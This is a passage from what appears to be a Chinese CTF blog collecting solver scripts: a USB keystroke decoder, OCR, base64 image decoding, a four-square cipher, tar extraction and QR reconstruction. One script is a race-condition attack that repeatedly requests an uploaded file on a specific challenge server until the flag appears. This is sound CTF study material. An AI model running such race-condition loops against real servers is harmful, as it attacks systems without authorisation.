class="string">"9"</span>, <span class="string">"27"</span>: <span class="string">"0"</span>,</span><br><span class="line">              <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"-"</span>, <span class="string">"2e"</span>: <span class="string">"="</span>, <span class="string">"2f"</span>: <span class="string">"["</span>,</span><br><span class="line">              <span class="string">"30"</span>: <span class="string">"]"</span>, <span class="string">"31"</span>: <span class="string">"\\"</span>, <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">";"</span>, <span class="string">"34"</span>: <span class="string">"'"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">","</span>, <span class="string">"37"</span>: <span class="string">"."</span>, <span class="string">"38"</span>: <span class="string">"/"</span>,</span><br><span class="line">              <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>, <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>,</span><br><span class="line">              <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>, <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>: <span class="string">"A"</span>, <span class="string">"05"</span>: <span class="string">"B"</span>, <span class="string">"06"</span>: <span class="string">"C"</span>, <span class="string">"07"</span>: <span class="string">"D"</span>, <span class="string">"08"</span>: <span class="string">"E"</span>, <span class="string">"09"</span>: <span class="string">"F"</span>, <span class="string">"0a"</span>: <span class="string">"G"</span>, <span class="string">"0b"</span>: <span class="string">"H"</span>, <span class="string">"0c"</span>: <span class="string">"I"</span>,</span><br><span class="line">             <span class="string">"0d"</span>: <span class="string">"J"</span>, <span class="string">"0e"</span>: <span class="string">"K"</span>, <span class="string">"0f"</span>: <span class="string">"L"</span>, <span class="string">"10"</span>: <span class="string">"M"</span>, <span class="string">"11"</span>: <span class="string">"N"</span>, <span class="string">"12"</span>: <span class="string">"O"</span>, <span class="string">"13"</span>: <span class="string">"P"</span>, <span class="string">"14"</span>: <span class="string">"Q"</span>, <span class="string">"15"</span>: <span class="string">"R"</span>,</span><br><span class="line">             <span class="string">"16"</span>: <span class="string">"S"</span>, <span class="string">"17"</span>: <span class="string">"T"</span>, <span class="string">"18"</span>: <span class="string">"U"</span>, <span class="string">"19"</span>: <span class="string">"V"</span>, <span class="string">"1a"</span>: <span class="string">"W"</span>, <span class="string">"1b"</span>: <span class="string">"X"</span>, <span class="string">"1c"</span>: <span class="string">"Y"</span>, <span class="string">"1d"</span>: <span class="string">"Z"</span>, <span class="string">"1e"</span>: <span class="string">"!"</span>,</span><br><span class="line">             <span class="string">"1f"</span>: <span class="string">"@"</span>, <span class="string">"20"</span>: <span class="string">"#"</span>, <span class="string">"21"</span>: <span class="string">"$"</span>, <span class="string">"22"</span>: <span class="string">"%"</span>, <span class="string">"23"</span>: <span class="string">"^"</span>, <span class="string">"24"</span>: <span class="string">"&amp;"</span>, <span class="string">"25"</span>: <span class="string">"*"</span>, <span class="string">"26"</span>: <span class="string">"("</span>, <span class="string">"27"</span>: <span class="string">")"</span>,</span><br><span class="line">             <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"_"</span>, <span class="string">"2e"</span>: <span class="string">"+"</span>, <span class="string">"2f"</span>: <span class="string">"&#123;"</span>,</span><br><span class="line">             <span class="string">"30"</span>: <span class="string">"&#125;"</span>, <span class="string">"31"</span>: <span class="string">"|"</span>, <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">"\""</span>, <span class="string">"34"</span>: <span class="string">":"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">"&lt;"</span>, <span class="string">"37"</span>: <span class="string">"&gt;"</span>, <span class="string">"38"</span>: <span class="string">"?"</span>,</span><br><span class="line">             <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>, <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>,</span><br><span class="line">             <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>, <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> press <span class="keyword">in</span> keys:</span><br><span class="line">    Bytes = press.split(<span class="string">":"</span>)</span><br><span class="line">    <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> Bytes[<span class="number">3</span>] == <span class="string">"00"</span>:</span><br><span class="line">            result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"20"</span>:  <span class="comment"># shift key is pressed.</span></span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> Bytes[<span class="number">3</span>] == <span class="string">"00"</span>:</span><br><span class="line">            result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Unknow Key : %s"</span> % (Bytes[<span class="number">0</span>]))</span><br><span class="line">print(<span class="string">"[+] Found : %s"</span> % (result))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="web条件竞争脚本"><a href="#web条件竞争脚本" class="headerlink" title="web条件竞争脚本"></a>web条件竞争脚本</h2><p>通过不断访问一个文件形成条件竞争,获得flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://148.70.59.198:42534/uploads/9a155ffc4127de3a9e215a4d6f212d7f414ab49b/0bc87f6e573a0a69bc1a49c448be09b7775399c1'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Syc'</span> <span class="keyword">in</span>  r.text:</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="文字识别脚本"><a href="#文字识别脚本" class="headerlink" title="文字识别脚本"></a>文字识别脚本</h2><p>做题时收集的文字识别脚本,调用了百度ai<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipOcr</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#获取开始时间</span></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="string">""" 你的 APPID AK SK """</span></span><br><span class="line">APP_ID = <span class="string">''</span></span><br><span class="line">API_KEY = <span class="string">''</span></span><br><span class="line">SECRET_KEY = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">""" 读取图片 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_content</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    print(filePath)</span><br><span class="line">    <span class="keyword">with</span> open(filePath, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">return</span> fp.read()</span><br><span class="line">    </span><br><span class="line"><span class="string">""" 写入文本 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_on_txt</span><span class="params">(content,filePath,linefeed = <span class="string">"0"</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    content：要写入的内容</span></span><br><span class="line"><span class="string">    filePath：要写入文件的路径</span></span><br><span class="line"><span class="string">    linefeed ：判断是否换行</span></span><br><span class="line"><span class="string">        - 1 为不换行 </span></span><br><span class="line"><span class="string">        - 其他 为换行</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment">#只需要将之前的”w"改为“a"即可，代表追加内容</span></span><br><span class="line">    <span class="keyword">with</span> open(filePath,<span class="string">"a"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file.write(content)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"写入错误"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> linefeed != <span class="string">"1"</span>:</span><br><span class="line">                file.write(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#图片路径</span></span><br><span class="line">img_path = <span class="string">r"D:\\ubw (2019-11-2 9-55-43)"</span> <span class="comment"># 也可采用 r" D:\Test_path" 或者是"D:/Test_path"</span></span><br><span class="line"><span class="comment">#文本路径</span></span><br><span class="line">txt_path = <span class="string">r"D:\\ubw (2019-11-2 9-55-43)\\base.txt"</span></span><br><span class="line"></span><br><span class="line">options = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历所有文件（使用 os.walk 方法）</span></span><br><span class="line"><span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(img_path):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="comment"># 使用join函数将文件名称和文件所在根目录连接起来</span></span><br><span class="line">        file_dir = os.path.join(root, file)</span><br><span class="line">        print(file_dir)</span><br><span class="line">        <span class="comment"># write_on_txt("=============================",txt_path,"0")</span></span><br><span class="line">        write_on_txt(<span class="string">"文件名:"</span>+ file_dir,txt_path,<span class="string">"0"</span>)</span><br><span class="line">        <span class="comment">#判断是否是图片</span></span><br><span class="line">        <span class="keyword">if</span> file_dir[<span class="number">-4</span>:]==<span class="string">".png"</span><span class="keyword">or</span> file_dir[<span class="number">-4</span>:]==<span class="string">".jpg"</span>:</span><br><span class="line">            <span class="comment">#传入图片</span></span><br><span class="line">            image = get_file_content(file_dir)</span><br><span class="line">            <span class="string">""" 调用通用文字识别, 图片参数为本地图片 """</span></span><br><span class="line">            a = client.basicGeneral(image, options)</span><br><span class="line">            <span class="comment"># 查看返回的结果</span></span><br><span class="line">            <span class="comment"># print(a['words_result'])</span></span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">for</span> dic <span class="keyword">in</span> a[<span class="string">'words_result'</span>]:</span><br><span class="line">                print(dic[<span class="string">'words'</span>])</span><br><span class="line">                write_on_txt(dic[<span class="string">'words'</span>],txt_path,<span class="string">"0"</span>)</span><br><span class="line">                    </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Running time: %1.2f Seconds'</span>%(end-start))</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解base64图片-PHP脚本"><a href="#解base64图片-PHP脚本" class="headerlink" title="解base64图片(PHP脚本)"></a>解base64图片(PHP脚本)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgBase64ToFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"> </span><br><span class="line">        $dir_path = realpath(<span class="string">"./"</span>) ;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir_path)) &#123;</span><br><span class="line">            mkdir($dir_path, <span class="number">0777</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $base64_image_content = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (!$base64_image_content || !$dir_path) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line">        $new_file = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(data:\s*image\/(\w+);base64,)/'</span>, $base64_image_content, $result)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>($result[<span class="number">2</span>])) &#123;</span><br><span class="line">                $type = $result[<span class="number">2</span>];</span><br><span class="line">                $new_file = $dir_path . time() . <span class="string">".&#123;$type&#125;"</span>;</span><br><span class="line">                file_put_contents($new_file, base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">''</span>, $base64_image_content)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        print_r($new_file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src=".'</span>.$new_file.<span class="string">'"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">imgBase64ToFile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="四方解密脚本"><a href="#四方解密脚本" class="headerlink" title="四方解密脚本"></a>四方解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">matrix = <span class="string">'ABCDEFGHIJKLMNOPRSTUVWXYZ'</span></span><br><span class="line">pla = <span class="string">'abcdefghijklmnoprstuvwxyz'</span></span><br><span class="line">key1 = <span class="string">'[HELLO]'</span></span><br><span class="line">key2 = <span class="string">'[WORLD]'</span></span><br><span class="line">key1 = <span class="string">''</span>.join(collections.OrderedDict.fromkeys(key1))</span><br><span class="line">key2 = <span class="string">''</span>.join(collections.OrderedDict.fromkeys(key2))</span><br><span class="line"></span><br><span class="line">matrix1 = re.sub(<span class="string">'[\[\]]'</span>,<span class="string">''</span>,key1) + re.sub(key1,<span class="string">''</span>,matrix)</span><br><span class="line">matrix2 = re.sub(<span class="string">'[\[\]]'</span>,<span class="string">''</span>,key2) + re.sub(key2,<span class="string">''</span>,matrix)</span><br><span class="line"></span><br><span class="line">matrix_list1 = []</span><br><span class="line">matrix_list2 = []</span><br><span class="line">pla_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(matrix1),<span class="number">5</span>):</span><br><span class="line">    matrix_list1.append(list(matrix1[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print matrix_list1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(matrix2),<span class="number">5</span>):</span><br><span class="line">    matrix_list2.append(list(matrix2[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print matrix_list2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(pla),<span class="number">5</span>):</span><br><span class="line">    pla_list.append(list(pla[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print pla_list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询两个密文字母位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_index1</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix_list1)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(matrix_list1[i])):</span><br><span class="line">            <span class="keyword">if</span> matrix_list1[i][j] == x:</span><br><span class="line">                <span class="keyword">return</span> i,j</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_index2</span><span class="params">(y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(len(matrix_list2)):</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(len(matrix_list2[k])):</span><br><span class="line">            <span class="keyword">if</span> matrix_list2[k][l] == y:</span><br><span class="line">                <span class="keyword">return</span> k,l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_pla</span><span class="params">(letter)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#两个子母中第一个字母位置</span></span><br><span class="line">    first = find_index1(letter[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">#两个子母中第二个字母位置</span></span><br><span class="line">    second = find_index2(letter[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    pla = <span class="string">''</span></span><br><span class="line">    pla += pla_list[first[<span class="number">0</span>]][second[<span class="number">1</span>]]</span><br><span class="line">    pla += pla_list[second[<span class="number">0</span>]][first[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pla</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cip = <span class="string">'BLMIMTOWUNCBMD'</span></span><br><span class="line">    pla = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cip),<span class="number">2</span>):</span><br><span class="line">        pla += gen_pla(cip[i:i+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">print</span> pla</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="连续解压压缩包脚本"><a href="#连续解压压缩包脚本" class="headerlink" title="连续解压压缩包脚本"></a>连续解压压缩包脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">  tf = tarfile.open(str(i)+<span class="string">".tar"</span>)</span><br><span class="line">  tf.extractall()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="将javascript处理后的编码还原成QR图片脚本"><a href="#将javascript处理后的编码还原成QR图片脚本" class="headerlink" title="将javascript处理后的编码还原成QR图片脚本"></a>将javascript处理后的编码还原成QR图片脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">b = list(map(int, <span class="string">''</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line">shifters = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<hr>
